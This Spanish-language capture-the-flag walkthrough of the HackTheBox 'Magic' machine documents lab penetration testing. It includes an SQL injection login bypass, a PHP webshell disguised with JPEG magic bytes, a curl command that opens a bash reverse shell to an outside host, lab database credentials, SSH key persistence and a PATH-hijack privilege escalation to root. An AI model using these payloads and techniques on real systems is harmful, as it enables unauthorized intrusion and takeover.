# Máquina MAGIC

![](https://i.imgur.com/UAxviAj.png)


# Reconocimiento

## Nmap
Los puertos **22** y **80** se encuentran abiertos en la máquina:
```
┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/MAGIC]
└─# nmap -sS --min-rate 5000 -p- 10.10.10.185          
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-23 12:54 -05
Nmap scan report for 10.10.10.185
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.17 seconds
```
Lanzamiento de scripts básicos de reconocimiento y versión:
```
┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/MAGIC]
└─# nmap -sCV --min-rate 5000 -p22,80 10.10.10.185  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-23 13:01 -05
Nmap scan report for 10.10.10.185
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Magic Portfolio
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.48 seconds
```
## Puerto 80 - Web

El puerto 80 se encuentra un panel de login `http://10.10.10.185/login.php` el cual es vulnerable a SQLi, esto es sencillo de ver al introducir las siguiente consulta:
```
Username:cr4y0' or 1=1-- -
Password:randomtext
```

![](https://i.imgur.com/mRCzKTb.png)

Al obtener acceso al panel de control se puede ver un apartado para subir imágenes:

![](https://i.imgur.com/87p9Z3Y.png)

# Enumeración

Se ha visto que se interpretan archivos con extensión **php (login.php)**, esto puede dar una idea en intentar ganar acceso con la subida de un archivo que logre ser interpretado con **php**. 
**Puntos a tener en cuenta para la validación de la subida de un archivo (PHP Webshell):**
* Solo se valida el **Content-Type** en la cabecera de subida, el cual debe ser el apropiado, en este caso el de una imagen **(image/png)**.
* La **extensión del archivo** puede pertenecer a una lista de bloqueo/acceso, para ello tener en cuenta lo siguiente:
    1. La validación se puede dar solo en la parte final del nombre del archivo subido, es decir las extensiones .php.jpg, .php.png o .php.jpeg serán válidos.
    2. La extensión .php puede estar bloqueada totalmente en el sitio, para ello se probarían extensiones .php5, .phtml, etc.
* Se realiza una validación sobre los **magic bytes** para que así el archivo coincida con los tipos permitidos.

**Obs:** Esto puntos no son estrictos pero pueden ser de gran ayuda. :slightly_smiling_face: 


## Uploads

También se debe tener en cuenta el lugar de almacenamiento de los archivos que se suben, esto se puede obtener revisando el **código HTML**, inspeccionando el elemento o suponiendo que se encuentra en la carpeta uploads con ayuda de **Dirbuster**:

`Ctrl + U`

![](https://i.imgur.com/JGNIUNP.png)

`Dirbuster`

![](https://i.imgur.com/pQUZNmp.png)

## Burpsuite

Con Burpsuite se empienzan a realizar pruebas sobre los puntos antes mencionado para la subida del archivo:

* ¿Ocurrirá unicamente la validación en el **Content-Type**?
No

![](https://i.imgur.com/84Y1jMT.png)

* ¿Ocurrirá unicamente la validación en el **Content-Type** o **Filename(nombre y extensión de archivo)**?
No

![](https://i.imgur.com/m9vpIkV.png)

Esto indica que existe un parámetro en la validación que no se ha considerado, estos son los **magic bytes**.

# Obteniendo Acceso

## Burpsuite

1. Se indica el **filename** y **Content-Type**:

![](https://i.imgur.com/F9cVXGW.png)

2. Se coloca el código PHP malicioso entre el contenido de la imagen:

![](https://i.imgur.com/OfGyNEI.png)

Y se obtiene una PHP Webshell:

![](https://i.imgur.com/TvdKnU9.png)

## Head

Otra forma de obtener una Webshell es con el comando `head` que permite obtener los primeros bytes de un archivo y `xxd` para transformalos a hexadecimal:

```
┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/MAGIC]
└─# head -c 20 imagen.jpg | xxd > test

┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/MAGIC]
└─# cat test

00000000: ffd8 ffe1 0018 4578 6966 0000 4949 2a00  ......Exif..II*.
00000010: 0800 0000                                ....

┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/MAGIC]
└─# cat cmd.php   

<?php
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>

┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/MAGIC]
└─# cat test cmd.php > webshell.php.jpg
```
Subimos el archivo **webshell.php.jpg** y se ejecuta este archivo con **Curl**:

```
┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/MAGIC]
└─# curl -X GET "http://10.10.10.185/images/uploads/webshell.php.jpg?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.11/449%200%3E%261%27" >> output
```

Se obtiene acceso como **www-data**:

![](https://i.imgur.com/f7fu1UY.png)

# Escalación de Privilegios

Se tiene el achivo **db.php5** dentro de **/var/www/Magic**:
```
www-data@ubuntu:/var/www/Magic$ ls -la
total 52
drwxr-xr-x 4 www-data www-data 4096 Jul 12  2021 .
drwxr-xr-x 4 root     root     4096 Jul  6  2021 ..
-rwx---r-x 1 www-data www-data  162 Oct 18  2019 .htaccess
drwxrwxr-x 6 www-data www-data 4096 Jul  6  2021 assets
-rw-r--r-- 1 www-data www-data  881 Oct 16  2019 db.php5
drwxr-xr-x 4 www-data www-data 4096 Jul  6  2021 images
-rw-rw-r-- 1 www-data www-data 4528 Oct 22  2019 index.php
-rw-r--r-- 1 www-data www-data 5539 Oct 22  2019 login.php
-rw-r--r-- 1 www-data www-data   72 Oct 18  2019 logout.php
-rw-r--r-- 1 www-data www-data 4520 Oct 22  2019 upload.php
```

Se obtienen credenciales dentro del archivo db.php5 para entablar una conexión a la base de datos **mysql**:

![](https://i.imgur.com/gRxODBf.png)

## Theseus
El comando `mysql` no se encuentra en la máquina víctima, por lo que se tiene que usar un sustito `mysqldump`:

```
www-data@ubuntu:/home/theseus$ mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
```
Se obtiene una nueva credencial del usuario admin en la tabla **login**, la cual puede haber sido rehusada en el sistema para acceder como el usuario **theseus**:

![](https://i.imgur.com/14AeLPU.png)

Se obtienen privilegios del usuario **theseus**: 

![](https://i.imgur.com/lwpbMZo.png)

## Persistencia

Dado que el servicio por SSH está activo en la máquina víctima, genero una clave **id_rsa.pub** en mi máquina de atacante con `ssh-keygen` la cual renombraré como **authorized_keys** y subiré a la ruta **/home/theseus/.ssh** para obtener acceso por ssh sin necesidad de brindar contraseña:
```
❯ ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/cr4y0/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/cr4y0/.ssh/id_rsa
Your public key has been saved in /home/cr4y0/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:b9xpvbQEMaK0YGd7FsoO6iSeDOf9JJVhMyRBAFJ356g cr4y0@kali
The key's randomart image is:
+---[RSA 3072]----+
|oooo=.o .        |
|.  . + +         |
|      O = o o    |
|     + @ = o o   |
|    E + S o .    |
|     o o = . +   |
|. o + . . + + +  |
| * * o   . . o o |
|  = o..       o  |
+----[SHA256]-----+
```

![](https://i.imgur.com/05X6zEE.png)

Ahora se tiene una conexión por ssh:
```
ssh theseus@10.10.10.185
```

![](https://i.imgur.com/GEyweD3.png)


## Root

Se ejecuta el linpeas.sh en la máquina víctima:
```
theseus@ubuntu:~/Desktop$ ./linpeas.sh 
```
Y se obtiene información sobre un binario SUID desconocido **sysinfo**:

![](https://i.imgur.com/74LrI9R.png)

Este binario llama la atención dado que el grupo **users** tiene permisos de ejecución y lectura, y el usuario theseus pertenece a este grupo:

![](https://i.imgur.com/h4dOrHx.png)

Ahora se ejecuta el comando ltrace junto al binario sysinfo:
```
theseus@ubuntu:~/Desktop$ ltrace /bin/sysinfo
```
**ltrace** imprime las llamadas realizadas fuera del binario sysinfo, en este caso se ve la función popen la cual tiene en su primer parámetro al comando "free -h". 

![](https://i.imgur.com/zn6F3S4.png)

El comando free se ejecuta sin usar un ruta absoluta, entonces se puede crear un comando free malicioso que sea llamado y ejecutado antes que el real(**path hijack**).

```
theseus@ubuntu:~/Desktop$ pwd
/home/theseus/Desktop
theseus@ubuntu:~/Desktop$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
theseus@ubuntu:~/Desktop$ export PATH=/home/theseus/Desktop:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
theseus@ubuntu:~/Desktop$ ls -la /bin/bash 
-rwxr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
theseus@ubuntu:~/Desktop$ nano free
```

Se crea el archivo free, a su vez se le brinda permisos de ejecución y se ejecuta el binario sysinfo:

![](https://i.imgur.com/tjTXjNG.png)

Obtención de privilegios como root:

![](https://i.imgur.com/7R3qgZx.png)

En este punto ya se pueden visualizar las flags **user.txt** y **root.txt**.

# Recomendaciones u anotaciones 🤓 : 
* Considerar las **restricciones** que pueden estar habilitadas o no a la hora de **subir un archivo** y lograr ser interpretados.
* Revisar los archivos `.htaccess` y otros **archivos de configuración** del servidor apache en `/etc/apache2/` o `/etc/apache2/mods-enabled` para entender como funcionan apache(en este caso, la interpretación de archivos php).
* Revisar los archivos dentro de `/var/www/` o `/var/www/Magic` en donde se pueden encontrar credenciales dentro de **archivos de configuración**.
*  Usar **herramientas alternativas a mysql** para listar información.
*  Tener en cuenta a los **binarios desconocidos**.
*  **strace o ltrace** son herramientas útiles para ver las llamadas en el sistema.


# Enlaces:

* Popen()
https://c-for-dummies.com/blog/?p=1418
* MIME Types
https://developer.mozilla.org/es/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types
* Strace y ltrace
https://www.cyberhades.com/2016/03/20/como-funcionan-ltrace-y-strace-y-en-que-se-diferencian/
* Cabecera SetHandler - Apache
https://www.php.net/manual/es/install.unix.apache2.php

* Writeups que me gustaron y ayudaron a tener un mejor entendimiento :hearts: : 

https://0xdf.gitlab.io/2020/08/22/htb-magic.html

https://offs3cg33k.medium.com/magic-htb-walkthrough-129e6a5c3c89

https://arkanoidctf.medium.com/hackthebox-writeup-magic-a3360a9081b8

https://snowscan.io/htb-writeup-magic/#

https://www.youtube.com/watch?v=ZJ72UuUlz10

https://www.youtube.com/watch?v=bLIcew9Iot8&t=1614s

